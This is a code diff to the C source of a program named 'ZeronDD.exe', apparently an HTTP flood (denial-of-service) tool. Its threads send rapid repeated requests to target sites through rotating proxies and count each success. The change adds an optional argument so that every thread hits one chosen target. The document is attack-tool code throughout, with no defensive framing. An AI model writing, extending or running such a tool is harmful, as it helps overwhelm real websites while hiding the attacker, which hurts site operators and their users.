@@ -9,6 +9,7 @@ static int 				thread_proxy_index = 0;
 static Proxy 			*proxy_list;
 static int 				proxy_list_size = 0;
 static unsigned char 	*proxy_failed;
+static char 			*fixed_target_site = NULL;
 
 void *task(void *userdata);
 
@@ -114,6 +115,7 @@ void *task(void *userdata)
 	unsigned int proxy_index;
 	long http_code;
 	int id;
+	char *target;
 
 
 	id = (int) userdata;
@@ -139,7 +141,8 @@ void *task(void *userdata)
 		}
 
 		proxy = &proxy_list[proxy_index];
-		HTTP_SetURL(http, proxy->target_site);
+		target = fixed_target_site ? fixed_target_site : proxy->target_site;
+		HTTP_SetURL(http, target);
 		HTTP_SetProxy(http, proxy->ip, proxy->user_password);
 		http_code = HTTP_Request(http);
 		if ((http_code == 0) || (http_code >= 400))
@@ -152,7 +155,7 @@ void *task(void *userdata)
 				if (proxy_failed[proxy_index] > 0)
 					proxy_failed[proxy_index]--;
 			)
-			 printf("[%s][%d] SUCCESS\n", proxy->target_site, proxy_index);
+			 printf("[%s][%d] SUCCESS\n", target, proxy_index);
 		}
 
 		usleep(20);
@@ -171,12 +174,17 @@ int main(int argc, char **argv)
 
 	if (argc < 3)
 	{
-		printf("Usage: ZeronDD.exe [threads_count] [path_to_proxies]\n");
+		printf("Usage: ZeronDD.exe [threads_count] [path_to_proxies] [optional][fixed_target]\n");
 		return 0;
 	}
 
 	threads_count = atoi(argv[1]);
 	proxies_file_path = argv[2];
+
+	if (argc > 3)
+	{
+		fixed_target_site = argv[3];
+	}
 
 	HTTP_ModuleInit();
 
